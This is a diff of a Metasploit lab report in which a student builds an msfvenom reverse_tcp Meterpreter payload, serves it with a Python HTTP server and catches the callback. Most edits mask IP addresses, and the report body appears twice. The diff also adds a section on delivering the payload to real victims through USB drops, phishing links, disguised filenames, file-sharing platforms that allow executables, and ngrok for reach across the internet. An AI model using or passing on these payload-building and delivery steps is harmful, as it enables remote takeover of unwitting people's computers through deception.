@@ -1,7 +1,7 @@
 # Metasploit Client-Side Exploitation Lab Report
 
 **Date:** 2026-09-28  
-**Attacker Machine:** Main Kali Linux (192.168.0.x / 192.168.56.1)  
+**Attacker Machine:** Main Kali Linux (192.168.0.x / 192.168.56.x)  
 **Target Machine:** VirtualBox Kali Linux (192.168.56.x)  
 **Method:** Reverse TCP Meterpreter via msfvenom payload  
 
@@ -35,7 +35,7 @@ Both machines needed to be on the **same network** to communicate.
 **Run this on Main Kali (outside Metasploit, in a normal terminal):**
 
 ```bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o payload.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.x LPORT=4444 -f elf -o payload.elf
 ```
 
 **What each part means:**
@@ -108,10 +108,10 @@ This serves files from the current directory over HTTP so the target can downloa
 
 Option A — use wget in terminal:
 ```bash
-wget http://192.168.56.1:8080/payload.elf -O /home/kali/Downloads/payload.elf
+wget http://192.168.56.x:8080/payload.elf -O /home/kali/Downloads/payload.elf
 ```
 
-Option B — open the browser on VB Kali and go to `http://192.168.56.1:8080` then click the file.
+Option B — open the browser on VB Kali and go to `http://192.168.56.x:8080` then click the file.
 
 ---
 
@@ -345,7 +345,7 @@ python3 -m http.server: error: argument port: invalid int value: '8080~'
 # Metasploit Client-Side Exploitation Lab Report
 
 **Date:** 2026-09-28  
-**Attacker Machine:** Main Kali Linux (192.168.0.x / 192.168.56.1)  
+**Attacker Machine:** Main Kali Linux (192.168.0.x / 192.168.56.x)  
 **Target Machine:** VirtualBox Kali Linux (192.168.56.x)  
 **Method:** Reverse TCP Meterpreter via msfvenom payload  
 
@@ -379,7 +379,7 @@ Both machines needed to be on the **same network** to communicate.
 **Run this on Main Kali (outside Metasploit, in a normal terminal):**
 
 ```bash
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf -o payload.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.x LPORT=4444 -f elf -o payload.elf
 ```
 
 **What each part means:**
@@ -417,7 +417,7 @@ msfconsole
 ```
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
-set LHOST 192.168.56.1
+set LHOST 192.168.56.x
 set LPORT 4444
 exploit
 ```
@@ -431,7 +431,7 @@ exploit
 
 **Expected output:**
 ```
-[*] Started reverse TCP handler on 192.168.56.1:4444
+[*] Started reverse TCP handler on 192.168.56.x:4444
 ```
 
 The listener is now waiting for the payload to call back.
@@ -452,10 +452,10 @@ This serves files from the current directory over HTTP so the target can downloa
 
 Option A — use wget in terminal:
 ```bash
-wget http://192.168.56.1:8080/payload.elf -O /home/kali/Downloads/payload.elf
+wget http://192.168.56.x:8080/payload.elf -O /home/kali/Downloads/payload.elf
 ```
 
-Option B — open the browser on VB Kali and go to `http://192.168.56.1:8080` then click the file.
+Option B — open the browser on VB Kali and go to `http://192.168.56.x:8080` then click the file.
 
 ---
 
@@ -599,7 +599,7 @@ rm /home/kali/Downloads/payload.elf  # delete the payload file
 
 **What happened:** VB Kali could not reach 192.168.0.x because it was only connected to the 192.168.56.x (host-only) network. The payload ran but couldn't call back — no session was created.
 
-**Fix:** Rebuild the payload using `LHOST=192.168.56.1` (the host-only network IP that both machines share).
+**Fix:** Rebuild the payload using `LHOST=192.168.56.x` (the host-only network IP that both machines share).
 
 ---
 
@@ -684,3 +684,107 @@ python3 -m http.server: error: argument port: invalid int value: '8080~'
 **multi/handler** = Metasploit module used to catch reverse connections from payloads you created yourself.
 
 **Meterpreter** = an advanced shell that gives you file browsing, process viewing, downloading, screenshot capabilities and more — all over an encrypted channel.
+
+
+
+# Payload Delivery Methods — How to Get the Victim to Run It
+
+> Key concept: You never need access to the victim's machine beforehand.
+> You never need their IP. You make THEM come to YOU.
+
+---
+
+## Method 1 — USB Drop (Physical Access)
+
+Plug a USB into the target machine and copy the payload file.
+
+- No password needed
+- No network needed
+- No IP needed
+- Most effective when you have brief physical access
+
+**Social engineering version:** Leave a USB somewhere the target will find it labeled something tempting like "Salaries 2026" or "Exam Answers." Curiosity does the rest.
+
+---
+
+## Method 2 — Phishing Link (Most Common Real-World Method)
+
+Host the file on your machine and send them the link.
+
+**Start your server:**
+```bash
+python3 -m http.server 8080
+```
+
+**Send the victim a message:**
+> "Download this tool here: http://yourIP:8080/payload.elf"
+
+They click → download → run it. You get meterpreter.
+You never touched their machine.
+
+---
+
+## Method 3 — Disguised File
+
+Rename the payload to look like something harmless before sending.
+
+```bash
+cp payload.elf "ClassNotes.elf"
+cp payload.elf "Setup.elf"
+```
+
+Pair it with Method 2 — send a convincing download link with a convincing filename.
+
+---
+
+## Method 4 — File Sharing Platforms
+
+Send the file through platforms that don't block executables:
+
+| Platform | Works? |
+|---|---|
+| WhatsApp | ❌ Blocks executable files |
+| Gmail | ❌ Blocks executable files |
+| Telegram | ✅ Allows any file type |
+| Discord | ✅ Allows file uploads |
+| Google Drive | ✅ Allows any file type |
+| USB | ✅ No restrictions |
+
+---
+
+## Method 5 — Ngrok (For Internet/Different Network Scenarios)
+
+When the victim is not on the same network, use ngrok to get a public address.
+
+**Install and run:**
+```bash
+ngrok tcp 4444
+```
+
+Ngrok gives you a public address like:
+```
+0.tcp.ngrok.io:12345
+```
+
+Use that as LHOST when building the payload:
+```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12345 -f elf -o payload.elf
+```
+
+Now anyone on the internet can run the file and call back to you.
+
+---
+
+## The Big Picture
+
+You do NOT need:
+- ❌ The victim's IP address
+- ❌ Prior access to their machine
+- ❌ Their password
+
+You only need:
+- ✅ YOUR IP (or public address via ngrok) baked into the payload
+- ✅ A way to make the victim run the file
+
+**The human is always the vulnerability.**
+Social engineering (tricking people into running files) is the #1 attack method in the world because it bypasses every technical defense.
